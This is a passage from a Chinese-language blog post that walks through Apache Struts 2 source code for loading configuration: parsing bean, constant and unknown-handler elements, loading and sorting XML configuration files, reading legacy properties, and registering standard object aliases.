class="line">                        <span class="comment">// bean的生命周期</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">scopeStr</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;scope&quot;</span>);</span><br><span class="line">                        <span class="comment">// 是否是可选的</span></span><br><span class="line">                        <span class="comment">// 当optional属性为true时，即便class不存在加载也不会失败</span></span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">optional</span> <span class="operator">=</span> <span class="string">&quot;true&quot;</span>.equals(child.getAttribute(<span class="string">&quot;optional&quot;</span>));</span><br><span class="line">                        <span class="type">Scope</span> <span class="variable">scope</span> <span class="operator">=</span> Scope.SINGLETON;</span><br><span class="line">                        <span class="comment">// 多实例</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;prototype&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.PROTOTYPE;</span><br><span class="line">                            <span class="comment">// 只在一次请求过程中有效</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.REQUEST;</span><br><span class="line">                            <span class="comment">// 在一个session中有效</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;session&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.SESSION;</span><br><span class="line">                            <span class="comment">// 单例</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;singleton&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.SINGLETON;</span><br><span class="line">                            <span class="comment">// 在当前线程中有效</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;thread&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.THREAD;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (StringUtils.isEmpty(name)) &#123;</span><br><span class="line">                            name = Container.DEFAULT_NAME;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="comment">// 加载bean的实现类</span></span><br><span class="line">                            <span class="type">Class</span> <span class="variable">classImpl</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(impl, getClass());</span><br><span class="line">                            <span class="type">Class</span> <span class="variable">classType</span> <span class="operator">=</span> classImpl;</span><br><span class="line">                            <span class="comment">// 如果指定了bean的类型则使用指定的类型</span></span><br><span class="line">                            <span class="comment">// 否则以实现类的类型为bean的类型</span></span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotEmpty(type)) &#123;</span><br><span class="line">                                classType = ClassLoaderUtil.loadClass(type, getClass());</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 如果是静态注入</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(onlyStatic)) &#123;</span><br><span class="line">                                <span class="comment">// Force loading of class to detect no class def found exceptions</span></span><br><span class="line">                                classImpl.getDeclaredClasses();</span><br><span class="line">                                <span class="comment">// 在创建时，向bean中注入静态字段以及方法</span></span><br><span class="line">                                containerBuilder.injectStatics(classImpl);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// 如果已经存在同名同类型的bean了</span></span><br><span class="line">                                <span class="keyword">if</span> (containerBuilder.contains(classType, name)) &#123;</span><br><span class="line">                                    <span class="comment">// 获取当前bean节点在xml文件中的定位 得到一个LocationImpl对象</span></span><br><span class="line">                                    <span class="comment">// 包括行号 列号 uri 这三个来自命名空间 http://struts.apache.org/xwork/location 下的属性</span></span><br><span class="line">                                    <span class="comment">// 如 &lt;t xmlns:s=http://struts.apache.org/xwork/location s:src=&quot;&quot; s:row=&quot;&quot; s:col=&quot;&quot;&gt;</span></span><br><span class="line">                                    <span class="type">Location</span> <span class="variable">loc</span> <span class="operator">=</span> LocationUtils.getLocation(loadedBeans.get(classType.getName() + name));</span><br><span class="line">                                    <span class="comment">// 存在重复的bean直接就抛出异常了 这个值默认为true</span></span><br><span class="line">                                    <span class="keyword">if</span> (throwExceptionOnDuplicateBeans) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Bean type &quot;</span> + classType + <span class="string">&quot; with the name &quot;</span> +</span><br><span class="line">                                                name + <span class="string">&quot; has already been loaded by &quot;</span> + loc, child);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// Force loading of class to detect no class def found exceptions</span></span><br><span class="line">                                <span class="comment">// 强制进行类加载  可能跟类的加载机制有关系  懒加载</span></span><br><span class="line">                                <span class="comment">// 使用 loadClass 方法加载的类并没有执行静态代码块</span></span><br><span class="line">                                <span class="comment">// 调用该方法进行类的强制加载</span></span><br><span class="line">                                classImpl.getDeclaredConstructors();</span><br><span class="line"></span><br><span class="line">                                LOG.debug(<span class="string">&quot;Loaded type: &#123;&#125; name: &#123;&#125; impl: &#123;&#125;&quot;</span>, type, name, impl);</span><br><span class="line">                                <span class="comment">// 将bean注入到容器中  该方法后面再分析</span></span><br><span class="line">                                containerBuilder.factory(classType, name, <span class="keyword">new</span> <span class="title class_">LocatableFactory</span>(name, classType, classImpl, scope, childNode), scope);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 记录加载的bean</span></span><br><span class="line">                            loadedBeans.put(classType.getName() + name, child);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!optional) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load bean: type:&quot;</span> + type + <span class="string">&quot; class:&quot;</span> + impl, ex, childNode);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                LOG.debug(<span class="string">&quot;Unable to load optional class: &#123;&#125;&quot;</span>, impl);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 在 struts.xml 中定义常量，这些常量可以在 Struts 2 的配置文件和其他部分使用。</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;constant&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (valueSubstitutor != <span class="literal">null</span>) &#123;</span><br><span class="line">                            LOG.debug(<span class="string">&quot;Substituting value [&#123;&#125;] using [&#123;&#125;]&quot;</span>, value, valueSubstitutor.getClass().getName());</span><br><span class="line">                            value = valueSubstitutor.substitute(value);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 和properties文件的属性一个以西  </span></span><br><span class="line">                        props.setProperty(name, value, childNode);</span><br><span class="line">                        <span class="comment">// 该标签被用于处理那些在正常处理流程中未被识别或未被处理的请求</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodeName.equals(<span class="string">&quot;unknown-handler-stack&quot;</span>)) &#123;</span><br><span class="line">                        List&lt;UnknownHandlerConfig&gt; unknownHandlerStack = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;UnknownHandlerConfig&gt;();</span><br><span class="line">                        <span class="comment">// 定义处理器列表</span></span><br><span class="line">                        <span class="type">NodeList</span> <span class="variable">unknownHandlers</span> <span class="operator">=</span> child.getElementsByTagName(<span class="string">&quot;unknown-handler-ref&quot;</span>);</span><br><span class="line">                        <span class="type">int</span> <span class="variable">unknownHandlersSize</span> <span class="operator">=</span> unknownHandlers.getLength();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; unknownHandlersSize; k++) &#123;</span><br><span class="line">                            <span class="type">Element</span> <span class="variable">unknownHandler</span> <span class="operator">=</span> (Element) unknownHandlers.item(k);</span><br><span class="line">                            <span class="type">Location</span> <span class="variable">location</span> <span class="operator">=</span> LocationUtils.getLocation(unknownHandler);</span><br><span class="line">                            <span class="comment">// 通过名称进行引用</span></span><br><span class="line">                            <span class="comment">// 在使用时需要先定义  unknown-handler 标签</span></span><br><span class="line">                            <span class="comment">// &lt;unknown-handler name=&quot;defaultUnknownHandler&quot; class=&quot;com.example.DefaultUnknownHandler&quot; /&gt;</span></span><br><span class="line">                            <span class="comment">// &lt;unknown-handler name=&quot;customUnknownHandler&quot; class=&quot;com.example.CustomUnknownHandler&quot; /&gt;</span></span><br><span class="line"></span><br><span class="line">                                    unknownHandlerStack.add(<span class="keyword">new</span> <span class="title class_">UnknownHandlerConfig</span>(unknownHandler.getAttribute(<span class="string">&quot;name&quot;</span>), location));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!unknownHandlerStack.isEmpty())</span><br><span class="line">                            <span class="comment">// configuration由init方法传入   具体用处目前还不知道</span></span><br><span class="line">                            <span class="comment">// 但应该是在请求无法被匹配的之后将从这个configurration中取出 handler对请求进行处理</span></span><br><span class="line">                            configuration.setUnknownHandlerStack(unknownHandlerStack);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>documents 在<code>init</code>方法调用时才会被设置<br>这也就是说明  <code>containerProvider</code>在调用register方法前会先调用<code>init</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Configuration configuration)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.configuration = configuration;</span><br><span class="line">        <span class="built_in">this</span>.includedFileNames = configuration.getLoadedFileNames();</span><br><span class="line">        loadDocuments(configFileName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">loadDocuments</span><span class="params">(String configFileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        loadedFileUrls.clear();</span><br><span class="line">        documents = loadConfigurationFiles(configFileName, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Error loading configuration file &quot;</span> + configFileName, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> List&lt;Document&gt; <span class="title function_">loadConfigurationFiles</span><span class="params">(String fileName, Element includeElement)</span> &#123;</span><br><span class="line">        List&lt;Document&gt; docs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Document&gt; finalDocs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!includedFileNames.contains(fileName)) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Loading action configurations from: &#123;&#125;&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line">        includedFileNames.add(fileName);</span><br><span class="line"></span><br><span class="line">        Iterator&lt;URL&gt; urls = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">IOException</span> <span class="variable">ioException</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过资源名获取所有妈祖条件的资源的路径</span></span><br><span class="line">        urls = getConfigurationUrls(fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ioException = ex;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (urls == <span class="literal">null</span> || !urls.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (errorIfMissing) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Could not open files of the name &quot;</span> + fileName, ioException);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;Unable to locate configuration files of the name &#123;&#125;, skipping&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">return</span> docs;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (urls.hasNext()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        url = urls.next();</span><br><span class="line">        <span class="comment">// 通过文件管理器去加载文件了   默认时jbossfilemanager</span></span><br><span class="line">        is = fileManager.loadFile(url);</span><br><span class="line"></span><br><span class="line">        <span class="type">InputSource</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(is);</span><br><span class="line"></span><br><span class="line">        in.setSystemId(url.toString());</span><br><span class="line">        <span class="comment">// 解析xml文件添加到docs中</span></span><br><span class="line">        docs.add(DomHelper.parse(in, dtdMappings));</span><br><span class="line">        loadedFileUrls.add(url.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (XWorkException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (includeElement != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load &quot;</span> + url, e, includeElement);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load &quot;</span> + url, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Caught exception while loading file &quot;</span> + fileName, e, includeElement);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        is.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;Unable to close input stream&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sort the documents, according to the &quot;order&quot; attribute</span></span><br><span class="line">        <span class="comment">// 对文档进行排序</span></span><br><span class="line">        Collections.sort(docs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Document&gt;() &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Document doc1, Document doc2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> XmlHelper.getLoadOrder(doc1).compareTo(XmlHelper.getLoadOrder(doc2));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 解析文档中的 include 标签 然后将包含的xml文件也加载到docs中</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : docs) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;include&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">includeFileName</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (includeFileName.indexOf(<span class="string">&#x27;*&#x27;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// handleWildCardIncludes(includeFileName, docs, child);</span></span><br><span class="line">        <span class="type">ClassPathFinder</span> <span class="variable">wildcardFinder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathFinder</span>();</span><br><span class="line">        wildcardFinder.setPattern(includeFileName);</span><br><span class="line">        Vector&lt;String&gt; wildcardMatches = wildcardFinder.findMatches();</span><br><span class="line">        <span class="keyword">for</span> (String match : wildcardMatches) &#123;</span><br><span class="line">        finalDocs.addAll(loadConfigurationFiles(match, child));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        finalDocs.addAll(loadConfigurationFiles(includeFileName, child));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        finalDocs.add(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded action configuration from: &#123;&#125;&quot;</span>, fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalDocs;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="遗留属性的初始化"><a href="#遗留属性的初始化" class="headerlink" title="遗留属性的初始化"></a>遗留属性的初始化</h3><p>将 <code>PropertiesConfigurationProvider</code>对象添加到<code>containerProvider</code>中  关注其register方法 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">DefaultSettings</span> <span class="variable">settings</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSettings</span>();</span><br><span class="line">loadSettings(props, settings);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DefaultSettings</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Settings&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// stuts.properties, default.properties</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载所有的 struts.properties文件</span></span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(<span class="string">&quot;struts&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.warn(<span class="string">&quot;DefaultSettings: Could not find or error in struts.properties&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        delegate = <span class="keyword">new</span> <span class="title class_">DelegatingSettings</span>(list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// struts.custom.properties</span></span><br><span class="line">    <span class="comment">// 获取 struts.properties 中的 struts.custom.properties 属性的值 </span></span><br><span class="line">    <span class="comment">// 这个值指向了其他的配置文件 通过逗号分隔</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">files</span> <span class="operator">=</span> delegate.get(StrutsConstants.STRUTS_CUSTOM_PROPERTIES);</span><br><span class="line">        <span class="keyword">if</span> (files != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringTokenizer</span> <span class="variable">customProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(files, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (customProperties.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> customProperties.nextToken();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 将所有的文件进行读取解析封装成 PropertiesSettings 对象</span></span><br><span class="line">                    list.add(<span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(name));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOG.error(<span class="string">&quot;DefaultSettings: Could not find &#123;&#125;.properties. Skipping.&quot;</span>, name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建一个委托对象</span></span><br><span class="line">            <span class="comment">// 后面调用的loadSetting方法将调用delegate的list方法获取所有的配置并逐个遍历复制到性的prop对象中</span></span><br><span class="line">            delegate = <span class="keyword">new</span> <span class="title class_">DelegatingSettings</span>(list);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="初始化用户自定义的配置Provider"><a href="#初始化用户自定义的配置Provider" class="headerlink" title="初始化用户自定义的配置Provider"></a>初始化用户自定义的配置Provider</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_CustomConfigurationProviders</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取过滤器属性  configProviders</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">configProvs</span> <span class="operator">=</span> initParams.get(<span class="string">&quot;configProviders&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (configProvs != <span class="literal">null</span>) &#123;</span><br><span class="line">            String[] classes = configProvs.split(<span class="string">&quot;\\s*[,]\\s*&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (String cname : classes) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 加载类</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(cname, <span class="built_in">this</span>.getClass());</span><br><span class="line">                    <span class="comment">// 类实例化</span></span><br><span class="line">                    <span class="type">ConfigurationProvider</span> <span class="variable">prov</span> <span class="operator">=</span> (ConfigurationProvider)cls.newInstance();</span><br><span class="line">                    <span class="comment">// 如果时 ServletContextAwareConfigurationProvider 的子类 还需要先调用 initWithContext 方法</span></span><br><span class="line">                    <span class="comment">// 主要是看是否需要使用到servletContext里面的数据</span></span><br><span class="line">                    <span class="keyword">if</span> (prov <span class="keyword">instanceof</span> ServletContextAwareConfigurationProvider) &#123;</span><br><span class="line">                        ((ServletContextAwareConfigurationProvider)prov).initWithContext(servletContext);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 添加到容器中</span></span><br><span class="line">                    configurationManager.addContainerProvider(prov);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to instantiate provider: &quot;</span>+cname, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to access provider: &quot;</span>+cname, e);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to locate provider class: &quot;</span>+cname, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="初始化过滤器参数"><a href="#初始化过滤器参数" class="headerlink" title="初始化过滤器参数"></a>初始化过滤器参数</h3><p>将过滤器参数添加到  register 方法传入的 LocatableProperties 对象中</p>
<h3 id="初始化标准对象的别名（将标准对象添加到容器中）"><a href="#初始化标准对象的别名（将标准对象添加到容器中）" class="headerlink" title="初始化标准对象的别名（将标准对象添加到容器中）"></a>初始化标准对象的别名（将标准对象添加到容器中）</h3><p>创建 DefaultBeanSelectionProvider 并放到容器里<br>为一些标准对象设置别名  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder builder, LocatableProperties props)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建别名 其实就是将一些标准对象加入到容器中</span></span><br><span class="line">    alias(ObjectFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY, builder, props);</span><br><span class="line">    alias(ActionFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_ACTIONFACTORY, builder, props);</span><br><span class="line">    alias(ResultFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_RESULTFACTORY, builder, props);</span><br><span class="line">    alias(ConverterFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_CONVERTERFACTORY, builder, props);</span><br><span class="line">    alias(InterceptorFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_INTERCEPTORFACTORY, builder, props);</span><br><span class="line">    alias(ValidatorFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_VALIDATORFACTORY, builder, props);</span><br><span class="line">    alias(UnknownHandlerFactory.class, StrutsConstants.STRUTS_OBJECTFACTORY_UNKNOWNHANDLERFACTORY, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(FileManagerFactory.class, StrutsConstants.STRUTS_FILE_MANAGER_FACTORY, builder, props, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    alias(XWorkConverter.class, StrutsConstants.STRUTS_XWORKCONVERTER, builder, props);</span><br><span class="line">    alias(CollectionConverter.class, StrutsConstants.STRUTS_CONVERTER_COLLECTION, builder, props);</span><br><span class="line">    alias(ArrayConverter.class, StrutsConstants.STRUTS_CONVERTER_ARRAY, builder, props);</span><br><span class="line">    alias(DateConverter.class, StrutsConstants.STRUTS_CONVERTER_DATE, builder, props);</span><br><span class="line">    alias(NumberConverter.class, StrutsConstants.STRUTS_CONVERTER_NUMBER, builder, props);</span><br><span class="line">    alias(StringConverter.class, StrutsConstants.STRUTS_CONVERTER_STRING, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(ConversionPropertiesProcessor.class, StrutsConstants.STRUTS_CONVERTER_PROPERTIES_PROCESSOR, builder, props);</span><br><span class="line">    alias(ConversionFileProcessor.class, StrutsConstants.STRUTS_CONVERTER_FILE_PROCESSOR, builder, props);</span><br><span class="line">    alias(ConversionAnnotationProcessor.class, StrutsConstants.STRUTS_CONVERTER_ANNOTATION_PROCESSOR, builder, props);</span><br><span class="line">    alias(TypeConverterCreator.class, StrutsConstants.STRUTS_CONVERTER_CREATOR, builder, props);</span><br><span class="line">    alias(TypeConverterHolder.class, StrutsConstants.STRUTS_CONVERTER_HOLDER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(TextProvider.class, StrutsConstants.STRUTS_XWORKTEXTPROVIDER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(TextProvider.class, StrutsConstants.STRUTS_TEXT_PROVIDER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(TextProviderFactory.class, StrutsConstants.STRUTS_TEXT_PROVIDER_FACTORY, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(LocaleProviderFactory.class, StrutsConstants.STRUTS_LOCALE_PROVIDER_FACTORY, builder, props);</span><br><span class="line">    alias(LocalizedTextProvider.class, StrutsConstants.STRUTS_LOCALIZED_TEXT_PROVIDER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(ActionProxyFactory.class, StrutsConstants.STRUTS_ACTIONPROXYFACTORY, builder, props);</span><br><span class="line">    alias(ObjectTypeDeterminer.class, StrutsConstants.STRUTS_OBJECTTYPEDETERMINER, builder, props);</span><br><span class="line">    alias(ActionMapper.class, StrutsConstants.STRUTS_MAPPER_CLASS, builder, props);</span><br><span class="line">    alias(MultiPartRequest.class, StrutsConstants.STRUTS_MULTIPART_PARSER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(FreemarkerManager.class, StrutsConstants.STRUTS_FREEMARKER_MANAGER_CLASSNAME, builder, props);</span><br><span class="line">    alias(VelocityManager.class, StrutsConstants.STRUTS_VELOCITY_MANAGER_CLASSNAME, builder, props);</span><br><span class="line">    alias(UrlRenderer.class, StrutsConstants.STRUTS_URL_RENDERER, builder, 